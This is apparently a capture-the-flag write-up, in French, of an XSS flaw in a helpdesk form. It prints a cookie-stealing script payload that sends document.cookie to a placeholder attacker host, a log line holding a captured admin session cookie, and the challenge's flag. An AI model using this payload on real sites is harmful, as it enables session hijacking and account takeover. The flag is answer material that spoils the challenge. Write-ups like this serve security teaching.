# Internal Support

## wu

On a un formulaire sujet a une vulnérabilité XSS. On s'en rend compte facilement avec un simple:
```
<script>alert("XSS")</script>
```

Nous allons donc voler le cookie admin.


Notre Payload
```
<script>window.location = "http://<IP>/stealer.php?c=" + document.cookie;</script> 
```


Our server:
```

<----- Request End -----

46.30.202.223 - - [14/Nov/2020 15:09:35] "GET /stealer.php?c=session=.eJwlTstqAzEM_BXjcyj2riXZ-YreS1hkW8qGptmy3pxC_r2CnoYZaR4vv-idxyrDn79e3h0G_kfG4Kv4k_-8Cw9x9-3qbg93bI5bs6M71ttwv_bz4S_vy8lCdhmrPx_7U4zduj_70mCuNRXoESOxTBQ1M_GMFFpKIWEsikG5UIYOMZF2VOwZG0miwGFOogpTnnLLFbgTakGNrBIFy1xEOYUJIHUuTJTizKhQoQasHWz-8hyy_6-JRtvYdTm2b3mYkBGrWiY0Kg0zaezmShWLdWbC3lszTfz7D_jxVzI.X6_zLg.429-HHNVlxb8Cn-QXp5SPRAV3YA HTTP/1.1" 200 -

----- Request Start ----->
```


On edit notre cookie avec Burpsuite

```
<section style="margin-top: 50px;" class="pt-95 pb-100">
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-lg-8">
        <div class="section-title pb-20">
          <h4 class="title">TODOLIST</h4>
        </div>
      </div>
    </div>
    <div class="row justify-content-center">
      <div class="col-lg-8">
        <div class="section-title pb-20">

          <p class="text">
            - Fix the kernel panic problem on the servers
          </p>

          <p class="text">
            - Find a solution for the XSS on the helpdesk system
          </p>

          <p class="text">
            - Hide the flag &#34;NoUserValidationIsADangerousPractice&#34; a little bit better
          </p>

        </div>
      </div>
    </div>
  </div>
</section>
```
